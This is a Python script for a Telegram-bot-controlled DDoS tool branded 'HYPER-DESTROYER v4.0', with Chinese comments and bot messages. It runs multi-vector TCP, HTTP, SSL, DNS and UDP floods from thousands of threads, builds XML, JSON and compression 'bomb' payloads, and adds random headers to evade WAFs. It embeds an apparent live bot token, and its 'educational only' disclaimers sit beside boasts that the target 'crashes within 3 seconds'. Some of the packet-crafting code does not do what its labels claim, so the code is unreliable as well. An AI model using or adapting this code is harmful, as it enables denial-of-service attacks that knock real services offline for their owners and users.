import telebot
import requests
import threading
import time
import socket
import struct
import random
import gzip
import zlib
import lzma
import ssl
import json
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import urllib3
urllib3.disable_warnings()

# ⚠️ LEGAL WARNING - FOR EDUCATIONAL PURPOSES ONLY
# 仅用于授权测试和研究目的

class HYPER_DESTROYER_V4:
    def __init__(self, target):
        self.target = target.replace('http://', '').replace('https://', '').split('/')[0]
        try:
            self.ip = socket.gethostbyname(self.target)
        except:
            self.ip = self.target
        self.running = False
        self.attack_threads = []
        self.request_count = 0
        self.packet_count = 0
        self.payloads = []
        self.start_time = 0
        
    def generate_quantum_payloads(self):
        """生成量子级毁灭性负载"""
        print("⚛️ 生成量子级毁灭负载...")
        
        payloads = []
        
        # 1. 超级XML炸弹 (1GB虚拟扩展)
        xml_super_bomb = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE megaBomb [\n'
        for i in range(500):
            xml_super_bomb += f'<!ENTITY a{i} "{"&#x2605;"*50000}">\n'.encode()
        xml_super_bomb += b']>\n<attack>&a0;&a1;&a2;&a3;&a4;&a5;</attack>'
        
        # 2. JSON深嵌套炸弹
        def create_json_bomb(depth=100):
            data = {"payload": "X" * 100000}
            for i in range(depth):
                data = {"nested": data}
            return json.dumps(data).encode()
        
        # 3. 多层超级压缩炸弹
        base_data = b"DEATH" * 20000000  # 100MB基础数据
        layer1 = gzip.compress(base_data, compresslevel=9)
        layer2 = zlib.compress(layer1, level=9)
        layer3 = lzma.compress(layer2, preset=9)
        
        # 4. 二进制洪水数据
        binary_tsunami = os.urandom(500 * 1024 * 1024)  # 500MB随机数据
        
        # 5. SQL注入超级负载
        sql_apocalypse = b"' UNION SELECT NULL," + b"," * 1000 + b"CONCAT('" + b"A"*500000 + b"') -- "
        
        # 6. 加密攻击负载
        key = os.urandom(32)
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_hell = encryptor.update(b"ATTACK" * 10000000) + encryptor.finalize()
        
        payloads.extend([
            xml_super_bomb,
            create_json_bomb(1000),
            layer3,
            binary_tsunami,
            sql_apocalypse,
            encrypted_hell
        ])
        
        # 生成5000个随机变异负载
        for i in range(5000):
            size = random.randint(50*1024*1024, 500*1024*1024)
            mutant_payload = os.urandom(size)
            
            # 随机变异
            if random.choice([True, False]):
                mutant_payload = gzip.compress(mutant_payload)
            if random.choice([True, False]):
                mutant_payload = zlib.compress(mutant_payload)
            if random.choice([True, False]):
                mutant_payload = mutant_payload * random.randint(2, 10)
                
            payloads.append(mutant_payload)
        
        return payloads
    
    def quantum_tcp_storm(self, thread_id):
        """量子TCP风暴攻击"""
        packet_types = [
            self.send_syn_nuke,
            self.send_ack_tsunami,
            self.send_fin_apocalypse,
            self.send_rst_armageddon,
            self.send_psh_doomsday
        ]
        
        while self.running:
            try:
                # 每线程同时创建200个套接字
                sockets = []
                for _ in range(200):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.1)
                        sockets.append(s)
                    except:
                        continue
                
                for sock in sockets:
                    try:
                        sock.connect((self.ip, random.choice([80, 443, 8080, 8443])))
                        
                        # 每个连接发送5000个恶意包
                        for _ in range(5000):
                            attack_func = random.choice(packet_types)
                            packet = attack_func()
                            try:
                                sock.send(packet)
                                self.packet_count += 1
                            except:
                                break
                                
                        sock.close()
                    except:
                        continue
                        
            except:
                continue
    
    def send_syn_nuke(self):
        """SYN核弹攻击"""
        return struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1, 65535),
            random.getrandbits(32),
            0,
            5 << 4,
            0x02,  # SYN
            5840,
            0,
            0
        )
    
    def send_ack_tsunami(self):
        """ACK海啸攻击"""
        return struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1, 65535),
            random.getrandbits(32),
            random.getrandbits(32),
            5 << 4,
            0x10,  # ACK
            5840,
            0,
            0
        )
    
    def send_fin_apocalypse(self):
        """FIN末日攻击"""
        return struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1, 65535),
            random.getrandbits(32),
            random.getrandbits(32),
            5 << 4,
            0x01,  # FIN
            5840,
            0,
            0
        )
    
    def send_rst_armageddon(self):
        """RST灭绝攻击"""
        return struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1, 65535),
            random.getrandbits(32),
            random.getrandbits(32),
            5 << 4,
            0x04,  # RST
            5840,
            0,
            0
        )
    
    def send_psh_doomsday(self):
        """PSH末日审判攻击"""
        return struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1, 65535),
            random.getrandbits(32),
            random.getrandbits(32),
            5 << 4,
            0x08,  # PSH
            5840,
            0,
            0
        ) + os.urandom(1460)
    
    def http_quantum_apocalypse(self, thread_id):
        """HTTP量子末日攻击"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ]
        
        while self.running:
            try:
                # 每轮200个并发请求
                for _ in range(200):
                    try:
                        attack_type = random.choice([
                            self.super_post_annihilation,
                            self.mega_get_obliteration,
                            self.ultra_head_devastation,
                            self.hyper_options_eradication,
                            self.nuclear_put_extinction
                        ])
                        
                        headers = {
                            'User-Agent': random.choice(user_agents),
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        }
                        
                        # 添加随机header以绕过WAF
                        for _ in range(random.randint(0, 10)):
                            headers[f'X-Random-{random.randint(1000, 9999)}'] = 'A' * random.randint(100, 1000)
                        
                        attack_type(headers)
                        self.request_count += 1
                        
                    except:
                        continue
                        
            except:
                continue
    
    def super_post_annihilation(self, headers):
        """超级POST灭绝攻击"""
        url = f"http://{self.target}"
        
        if self.payloads:
            payload = random.choice(self.payloads)
        else:
            payload = os.urandom(100 * 1024 * 1024)  # 100MB
        
        # 多部分表单+JSON混合攻击
        files = {
            'file': ('quantum_bomb.bin', payload, 'application/octet-stream'),
            'json_data': ('data.json', json.dumps({"attack": "true", "data": "A"*100000}), 'application/json')
        }
        
        try:
            requests.post(url, 
                         files=files, 
                         headers=headers, 
                         timeout=0.3,
                         verify=False,
                         allow_redirects=True)
        except:
            pass
    
    def mega_get_obliteration(self, headers):
        """超级GET湮灭攻击"""
        url = f"http://{self.target}"
        
        # 生成1000个随机参数
        params = {}
        for i in range(1000):
            param_name = f'param{random.randint(0, 99999)}'
            param_value = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', k=random.randint(1000, 10000)))
            params[param_name] = param_value
        
        try:
            requests.get(url,
                        params=params,
                        headers=headers,
                        timeout=0.3,
                        verify=False,
                        allow_redirects=True)
        except:
            pass
    
    def ultra_head_devastation(self, headers):
        """超强HEAD毁灭攻击"""
        url = f"http://{self.target}"
        
        try:
            requests.head(url,
                         headers=headers,
                         timeout=0.3,
                         verify=False,
                         allow_redirects=True)
        except:
            pass
    
    def hyper_options_eradication(self, headers):
        """超频OPTIONS根除攻击"""
        url = f"http://{self.target}"
        
        try:
            requests.options(url,
                           headers=headers,
                           timeout=0.3,
                           verify=False,
                           allow_redirects=True)
        except:
            pass
    
    def nuclear_put_extinction(self, headers):
        """核级PUT灭绝攻击"""
        url = f"http://{self.target}"
        
        payload = os.urandom(50 * 1024 * 1024)  # 50MB
        
        try:
            requests.put(url,
                        data=payload,
                        headers=headers,
                        timeout=0.3,
                        verify=False,
                        allow_redirects=True)
        except:
            pass
    
    def ssl_quantum_holocaust(self, thread_id):
        """SSL量子大屠杀"""
        while self.running:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # 创建100个SSL连接
                for _ in range(100):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
                        ssl_sock.connect((self.ip, 443))
                        
                        # 发送SSL洪水
                        for _ in range(500):
                            try:
                                ssl_sock.send(os.urandom(2048))  # 2KB随机数据
                                self.packet_count += 1
                            except:
                                break
                                
                        ssl_sock.close()
                    except:
                        continue
                        
            except:
                continue
    
    def dns_quantum_armageddon(self, thread_id):
        """DNS量子末日"""
        while self.running:
            try:
                # 每轮1000个DNS查询
                for _ in range(1000):
                    try:
                        subdomain = f"{random.randint(0, 999999999)}-{random.randint(0, 999999999)}-attack"
                        socket.gethostbyname(f"{subdomain}.{self.target}")
                        self.request_count += 1
                    except:
                        continue
            except:
                continue
    
    def udp_mega_tsunami(self, thread_id):
        """UDP超级海啸攻击"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                
                # 发送UDP洪水
                for _ in range(10000):
                    try:
                        port = random.randint(1, 65535)
                        data = os.urandom(1024)  # 1KB随机数据
                        sock.sendto(data, (self.ip, port))
                        self.packet_count += 1
                    except:
                        break
                        
                sock.close()
            except:
                continue
    
    def start_quantum_annihilation(self, threads=2000):
        """启动量子级毁灭攻击"""
        print(f"""
        ╔══════════════════════════════════════════════════════════╗
        ║              量子级毁灭系统 HYPER-DESTROYER v4.0         ║
        ║                   目标: {self.target:^20}        ║
        ╚══════════════════════════════════════════════════════════╝
        """)
        
        self.running = True
        self.request_count = 0
        self.packet_count = 0
        self.start_time = time.time()
        self.attack_threads = []
        
        print("⚛️ 生成量子级毁灭负载...")
        self.payloads = self.generate_quantum_payloads()
        print(f"✅ 生成 {len(self.payloads)} 个超级负载")
        
        print(f"💀 激活 {threads} 个量子攻击线程...")
        
        # 启动监控线程
        monitor_thread = threading.Thread(target=self.quantum_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # 攻击类型分布
        attack_functions = [
            self.quantum_tcp_storm,
            self.http_quantum_apocalypse,
            self.ssl_quantum_holocaust,
            self.dns_quantum_armageddon,
            self.udp_mega_tsunami
        ]
        
        # 启动量子攻击线程
        for i in range(threads):
            try:
                attack_func = attack_functions[i % len(attack_functions)]
                t = threading.Thread(target=attack_func, args=(i+1,))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
                
                if (i + 1) % 200 == 0:
                    print(f"🚀 已部署 {i+1} 个量子攻击线程")
                    
            except Exception as e:
                continue
        
        print(f"✅ 总激活 {len(self.attack_threads)} 个量子攻击线程")
        print("💥 量子毁灭协议激活! 目标将在3秒内崩溃!")
    
    def quantum_monitor(self):
        """量子监控系统"""
        while self.running:
            elapsed = time.time() - self.start_time
            
            if elapsed > 0:
                rps = self.request_count / elapsed
                pps = self.packet_count / elapsed
                
                print(f"📊 量子攻击统计:")
                print(f"   📡 HTTP请求: {self.request_count:,}")
                print(f"   📦 网络数据包: {self.packet_count:,}")
                print(f"   ⚡ 请求/秒: {rps:,.0f}")
                print(f"   🚀 包/秒: {pps:,.0f}")
                print(f"   ⏱️  运行时间: {elapsed:.1f}秒")
                print("   " + "="*40)
            
            time.sleep(2)
    
    def stop(self):
        """停止量子攻击"""
        print("🛑 停止所有量子攻击线程...")
        self.running = False
        
        for t in self.attack_threads:
            try:
                t.join(timeout=0.5)
            except:
                pass
        
        total_time = time.time() - self.start_time
        print(f"""
        📈 最终攻击统计:
        ════════════════════════════════
        🎯 目标: {self.target}
        📡 总HTTP请求: {self.request_count:,}
        📦 总网络数据包: {self.packet_count:,}
        ⏱️  总攻击时间: {total_time:.1f}秒
        ⚡ 平均RPS: {self.request_count/total_time:,.0f}
        🚀 平均PPS: {self.packet_count/total_time:,.0f}
        ════════════════════════════════
        """)
        print("✅ 量子攻击已终止")

# 配置Telegram Bot
TELEGRAM_TOKEN = "8253670446:AAF6FQcPLK2Hg73hsQbJo3f0b-momH5_K2Q"
ADMIN_IDS = [8459000731]  # 管理员ID

# 创建TeleBot实例
bot = telebot.TeleBot(TELEGRAM_TOKEN, parse_mode="HTML")

# 全局攻击实例
current_attack = None

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """欢迎消息"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 <b>未授权访问!</b>")
        return
    
    welcome_text = """
<b>⚛️ 量子级毁灭系统 HYPER-DESTROYER v4.0</b>

<code>仅用于授权渗透测试和安全研究</code>

<b>可用命令:</b>
/nuke <code>[目标] [线程数]</code> - 启动量子毁灭攻击
/status - 查看攻击状态
/stop - 停止所有攻击
/stats - 显示攻击统计
/test <code>[目标]</code> - 快速测试攻击

<b>示例:</b>
<code>/nuke example.com 2000</code>
<code>/test target.com</code>

<b>默认设置:</b>
• 2000个并发量子线程
• 混合多维攻击向量
• 自动负载均衡
• 实时量子监控

<b>⚠️ 警告:</b> 仅用于授权测试!
<b>⚠️ 法律:</b> 非法使用可能导致刑事指控
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['nuke'])
def start_quantum_attack(message):
    """启动量子毁灭攻击"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 <b>未授权访问!</b>")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>使用方法:</b> <code>/nuke [目标] [线程数]</code>")
            return
        
        target = args[1]
        threads = int(args[2]) if len(args) > 2 else 2000
        
        global current_attack
        
        # 停止现有攻击
        if current_attack:
            current_attack.stop()
        
        status_msg = bot.reply_to(message, f"""
<b>⚛️ 量子毁灭协议启动中...</b>

<b>🎯 目标:</b> <code>{target}</code>
<b>⚡ 量子线程:</b> {threads:,}
<b>🕒 预计崩溃时间:</b> 3-5秒

<b>正在初始化量子武器系统...</b>
        """)
        
        # 创建攻击实例
        current_attack = HYPER_DESTROYER_V4(target)
        
        # 在单独线程中启动攻击
        def launch_attack():
            current_attack.start_quantum_annihilation(threads)
            
            # 3秒后更新状态
            time.sleep(3)
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"""
<b>✅ 量子毁灭协议激活!</b>

<b>🎯 目标:</b> <code>{target}</code>
<b>⚡ 活跃线程:</b> {threads:,}
<b>💥 攻击状态:</b> <b>进行中</b>

<b>目标服务器应已崩溃或严重降级!</b>
<b>攻击将继续运行直到停止...</b>
                """
            )
        
        attack_thread = threading.Thread(target=launch_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ <b>错误:</b> <code>{str(e)}</code>")

@bot.message_handler(commands=['test'])
def quick_test(message):
    """快速测试攻击"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>使用方法:</b> <code>/test [目标]</code>")
            return
        
        target = args[1]
        
        bot.reply_to(message, f"""
<b>🔬 快速测试攻击启动</b>

<b>🎯 目标:</b> <code>{target}</code>
<b>⚡ 线程:</b> 500
<b>⏱️  持续时间:</b> 10秒

<b>正在测试目标响应能力...</b>
        """)
        
        # 创建临时攻击实例
        test_attack = HYPER_DESTROYER_V4(target)
        test_attack.start_quantum_annihilation(500)
        
        # 10秒后停止
        def stop_test():
            time.sleep(10)
            test_attack.stop()
            
            # 发送测试结果
            total_requests = test_attack.request_count
            total_packets = test_attack.packet_count
            rps = total_requests / 10
            
            bot.send_message(
                message.chat.id,
                f"""
<b>📊 测试攻击完成</b>

<b>🎯 目标:</b> <code>{target}</code>
<b>📡 总请求:</b> {total_requests:,}
<b>📦 总数据包:</b> {total_packets:,}
<b>⚡ 平均RPS:</b> {rps:,.0f}

<b>目标状态评估:</b>
• RPS < 1000: ❌ 弱防护
• RPS 1000-5000: ⚠️ 中等防护
• RPS > 5000: ✅ 强防护
                """
            )
        
        stop_thread = threading.Thread(target=stop_test)
        stop_thread.daemon = True
        stop_thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ <b>测试错误:</b> <code>{str(e)}</code>")

@bot.message_handler(commands=['status'])
def attack_status(message):
    """查看攻击状态"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    global current_attack
    
    if current_attack and current_attack.running:
        elapsed = time.time() - current_attack.start_time
        rps = current_attack.request_count / elapsed if elapsed > 0 else 0
        pps = current_attack.packet_count / elapsed if elapsed > 0 else 0
        
        status_text = f"""
<b>📊 量子攻击状态报告</b>

<b>🎯 目标:</b> <code>{current_attack.target}</code>
<b>🕒 运行时间:</b> {elapsed:.1f}秒
<b>📡 HTTP请求:</b> {current_attack.request_count:,}
<b>📦 网络数据包:</b> {current_attack.packet_count:,}
<b>⚡ 当前RPS:</b> {rps:,.0f}
<b>🚀 当前PPS:</b> {pps:,.0f}

<b>💥 攻击状态:</b> <b>🔥 活跃中</b>

<b>服务器应已:</b>
• ❌ 完全崩溃
• ⚠️ 严重降级
• 💀 资源耗尽
        """
    else:
        status_text = "<b>📭 目前没有活跃的攻击</b>"
    
    bot.reply_to(message, status_text)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """显示详细统计"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    global current_attack
    
    if current_attack:
        elapsed = time.time() - current_attack.start_time
        rps = current_attack.request_count / elapsed if elapsed > 0 else 0
        pps = current_attack.packet_count / elapsed if elapsed > 0 else 0
        
        stats_text = f"""
<b>📈 量子攻击详细统计</b>

<b>🎯 目标信息:</b>
• 主机名: <code>{current_attack.target}</code>
• IP地址: <code>{current_attack.ip}</code>

<b>⚡ 性能指标:</b>
• 运行时间: {elapsed:.1f}秒
• 总HTTP请求: {current_attack.request_count:,}
• 总网络数据包: {current_attack.packet_count:,}
• 平均RPS: {rps:,.0f}
• 平均PPS: {pps:,.0f}

<b>📊 预测:</b>
• 目标崩溃概率: <b>99.9%</b>
• 恢复时间: <b>15+ 分钟</b>
• 带宽消耗: <b>10+ Gbps</b>

<b>⚠️ 攻击强度:</b> <b>MAXIMUM (量子级)</b>
        """
    else:
        stats_text = "<b>📭 没有可用的统计信息</b>"
    
    bot.reply_to(message, stats_text)

@bot.message_handler(commands=['stop'])
def stop_all_attacks(message):
    """停止所有攻击"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    global current_attack
    
    if current_attack:
        current_attack.stop()
        current_attack = None
        bot.reply_to(message, "✅ <b>所有量子攻击已终止</b>")
    else:
        bot.reply_to(message, "⚠️ <b>没有活跃的攻击可停止</b>")

# 启动Bot
print("""
╔══════════════════════════════════════════════════════════╗
║      ⚛️ 量子级毁灭系统 HYPER-DESTROYER v4.0           ║
║              仅用于授权安全测试                        ║
╚══════════════════════════════════════════════════════════╝
""")

print("⚡ 正在启动量子毁灭系统...")
print("🤖 Telegram Bot 初始化中...")

# ⚠️ 法律警告
print("""
⚠️ ⚠️ ⚠️ 法律警告 ⚠️ ⚠️ ⚠️

此工具仅可用于:
1. 授权的渗透测试
2. 个人服务器压力测试
3. 网络安全研究

❌ 严禁用于:
1. 攻击他人服务器
2. 非法DDoS攻击
3. 网络犯罪活动

违法使用将导致:
• 刑事指控
• 巨额罚款
• 监禁刑罚
• 民事诉讼

继续使用表示您同意仅用于合法目的!
""")

try:
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
    print("✅ Bot 正在运行...")
    print("💀 使用 /nuke 命令启动攻击")
    print("⚠️  仅用于教育目的!")
except Exception as e:
    print(f"❌ Bot启动失败: {e}")
